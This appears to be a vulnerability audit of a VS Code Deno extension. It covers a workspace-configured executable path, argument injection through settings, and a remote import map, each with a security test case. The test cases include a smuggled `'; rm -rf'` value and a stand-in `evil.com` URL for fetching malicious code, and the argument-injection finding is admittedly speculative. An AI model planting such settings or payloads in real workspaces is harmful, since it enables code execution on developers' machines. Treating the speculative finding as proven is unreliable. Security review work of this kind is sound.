## Vulnerability: Insecure Deno Executable Path Configuration

**Description:**
The extension retrieves the Deno executable’s location from the workspace configuration (typically stored in a file such as `.vscode/settings.json`) via the `deno.path` setting. When a user opens a workspace, the extension reads and resolves this configuration value as follows:

1. The configuration value is fetched (e.g., by calling `getWorkspaceConfigDenoExePath()` in `client/src/util.ts`).
2. If the value is relative, the code iterates over all workspace folders and uses `path.resolve()` to compute an absolute file path.
3. A simple existence check is performed using `fs.stat()` to confirm that a file exists at the resolved path.
4. The (unsanitized) path is then returned and used to launch the Deno language server, debug sessions, or tasks.

An attacker who is able to modify the workspace configuration (for example, by committing a malicious `.vscode/settings.json` file into a shared repository or tricking the developer into opening a compromised workspace) can supply a malicious path. This path might be relative (e.g., `"./malicious_executable"`) or use directory traversal. When the extension later spawns the executable via the vulnerable resolved path, it results in arbitrary command execution.

**Impact:**
Exploitation leads to the execution of an attacker-controlled binary with the privileges of the VS Code extension host. This could result in full system compromise, unauthorized code execution, data exfiltration, privilege escalation, or installation of persistent backdoors.

**Vulnerability Rank:** Critical

**Currently Implemented Mitigations:**
- The extension uses helper functions to resolve relative paths against all available workspace folders.
- It performs a simple file existence check with `fs.stat()` before accepting the resolved path.

**Missing Mitigations:**
- No sanitization or strict validation of the supplied executable path is performed (for example, no check against a trusted whitelist of directories or file signatures).
- There is no user confirmation or warning when a nonstandard or relative path is provided.
- No validation (such as digital signature checking or version validation) is conducted to ensure that the resolved file is the genuine Deno CLI.

**Preconditions:**
- The attacker must be able to inject or modify the workspace configuration file (for example, by committing a malicious configuration or through social engineering).
- The victim must later open the compromised workspace such that the extension loads and uses the attacker-controlled `deno.path` setting.

**Source Code Analysis:**
- In `client/src/util.ts`, the function `getDenoCommandPath()` calls `getWorkspaceConfigDenoExePath()` to retrieve the value of `deno.path` directly from the workspace configuration.
- If the provided path is not absolute, the code iterates over each workspace folder and applies `path.resolve()`, then verifies the file’s existence via an asynchronous `fs.stat()` call.
- No further checks (such as verifying the file’s legitimacy as the Deno executable) are made.
- The resulting path is then used in other modules (for example, in `commands.ts` when starting the language server and in `tasks.ts` for task execution) without additional validation, making it possible for an attacker-controlled executable to be launched.

**Security Test Case:**
1. Create a test workspace that includes a `.vscode/settings.json` file with the following content:
   ```json
   {
     "deno.path": "./malicious_executable"
   }
   ```
2. Place an executable file named `malicious_executable` in the workspace folder. This executable should perform a noticeable action (e.g., writing a distinctive log file or outputting a unique message).
3. Open the workspace in Visual Studio Code with the Deno extension enabled.
4. Trigger a Deno command (such as “Deno: Cache” or “Deno: Test”) that forces the extension to use the configured `deno.path`.
5. Verify that the malicious executable is launched by checking for the expected side effect (e.g., the creation of a log file or a specific message).
6. Confirm that the outcome indicates arbitrary code execution stemming from the unsanitized configuration.

## Vulnerability: Command Argument Injection via Malicious Configuration Options

**Description:**
The extension constructs the command-line arguments for the Deno CLI by directly incorporating configuration values (such as `"importMap"`, elements of `"codeLens.testArgs"`, and the `"unstable"` flag) as provided in the workspace configuration files (like `deno.json` or `.vscode/settings.json`). The process is as follows:

1. The extension reads configuration values via functions like `config.get()` within files such as `commands.ts` and `tasks.ts`.
2. These values are trimmed and pushed directly into an argument array that will be used to start the Deno process with `vscode.ProcessExecution`.
3. Although ProcessExecution uses an argument array (avoiding typical shell concatenation issues), if the underlying Deno CLI or any downstream tool does not enforce strict parsing (or internally performs concatenation), a maliciously crafted configuration value could result in injected command flags or payloads.

If an attacker can modify these configuration entries—by supplying specially crafted strings in settings like `"importMap"` or `"codeLens.testArgs"`—they may be able to influence the arguments passed to the Deno CLI, potentially leading to unintended behavior or arbitrary command execution.

**Impact:**
If exploited, this vulnerability could allow the attacker to inject dangerous payloads or extra flags into the Deno CLI’s execution. This may result in unexpected command behavior or arbitrary code execution, thereby compromising the developer’s environment.

**Vulnerability Rank:** High

**Currently Implemented Mitigations:**
- The extension leverages VS Code’s `ProcessExecution` API which accepts an array of arguments rather than a single concatenated shell command, reducing the risk of traditional shell injection.

**Missing Mitigations:**
- There is no explicit sanitization or validation of the configuration values before they are added to the arguments array.
- No whitelisting or strict type-checking is in place to ensure only safe values are provided.

**Preconditions:**
- The attacker must be able to modify the workspace configuration (via `deno.json` or `.vscode/settings.json`) to insert malicious strings.
- The exploit assumes that the downstream argument processing (either by the Deno CLI or intermediary tools) might inadvertently interpret injected payloads.

**Source Code Analysis:**
- In `commands.ts`, the extension reads configuration options (e.g., for `"importMap"` and `"codeLens.testArgs"`) directly from the configuration without further sanitization.
- The code trims these inputs and appends them as separate tokens to a Deno CLI argument array.
- The arguments array is then passed to `vscode.ProcessExecution` (as used in functions like `buildDenoTask` in `tasks.ts`).
- If the Deno CLI or any tool in the execution chain processes these tokenized arguments in an unsafe manner, this could open the door for command argument injection.

**Security Test Case:**
1. In a controlled test environment, create a workspace with a configuration file (either `deno.json` or `.vscode/settings.json`) where a parameter such as `"importMap"` is set to a string that includes an injection payload (for example: `"./innocent.json; rm -rf /tmp/malicious"`).
2. Open the workspace in Visual Studio Code to activate the extension.
3. Trigger the relevant Deno command (like the test command via Code Lens).
4. Monitor the behavior of the Deno CLI (via logs or system monitoring) to determine if the unsanitized argument leads to unintended processing or execution of the injection payload.
5. Confirm that such an injection results in demonstrable side effects indicative of command argument injection.

## Vulnerability: Remote Module Injection via Malicious Import Map

**Description:**
The extension supports configuration of remote modules via import maps specified in configuration files (such as `deno.json`, `deno.jsonc`, or through the `"deno.importMap"` setting in `.vscode/settings.json`). The process is as follows:

1. The extension reads the import map configuration using calls like `config.get("importMap")`.
2. If provided, the value (typically a remote URL pointing to a JSON file) is trimmed and appended as an argument to the Deno CLI (e.g., using the `--import-map` flag) without further sanitization.
3. When a Deno command that initiates remote module fetching (such as “Deno: Cache” or operations during testing/linting) is executed, the Deno CLI uses the supplied import map and fetches the remote module.
4. If the import map URL is attacker-controlled, a malicious remote module can be downloaded and subsequently executed.

By controlling the import map, an attacker can inject and force the execution of arbitrary remote code in the developer’s environment.

**Impact:**
Exploitation can lead to arbitrary code execution on the developer’s workstation. The attacker-controlled remote module could deliver malicious code, resulting in compromise of the development environment, data exfiltration, or lateral movement within the network.

**Vulnerability Rank:** Critical

**Currently Implemented Mitigations:**
- The extension relies on VS Code’s trusted configuration system to some extent and passes configuration values directly to the Deno CLI.

**Missing Mitigations:**
- There is no explicit validation or sanitization of the remote URL in the import map configuration.
- No domain whitelist or restrictions are enforced to ensure that only trusted remote modules are fetched.
- There is no prompt to confirm the execution of code from a remote location, nor is there sandboxing for the remote module’s execution.

**Preconditions:**
- The attacker must be able to control or modify the workspace configuration (for example, by committing a malicious `deno.json` or import map file).
- The developer must open the compromised workspace and allow the extension to load the attacker-controlled import map.

**Source Code Analysis:**
- In files such as `debug_config_provider.ts` and `tasks.ts`, the extension reads the import map configuration (using `config.get("importMap")` or similar methods).
- The retrieved value is then trimmed and added to the runtime arguments array as two separate tokens: first the `--import-map` flag, followed by the URL.
- No additional checks or sanitization is performed on this URL before passing it to the Deno CLI.
- Consequently, when a Deno command related to caching or module resolution is executed, the CLI downloads the remote module specified by the unsanitized URL, potentially executing malicious code.

**Security Test Case:**
1. Create a test workspace that includes a malicious configuration file (for example, a `deno.json` or `.vscode/settings.json`) that specifies an import map with an entry such as:
   ```json
   {
     "deno.importMap": "https://evil.com/malicious.js"
   }
   ```
2. Open the workspace in Visual Studio Code with the Deno extension enabled.
3. Trigger the “Deno: Cache” command (or any operation that causes remote module fetching).
4. Monitor network traffic and the output from the Deno CLI to verify that it attempts to download a module from “https://evil.com/malicious.js”.
5. Validate that the download and intended execution of the remote module confirms the exploitation of the vulnerability.
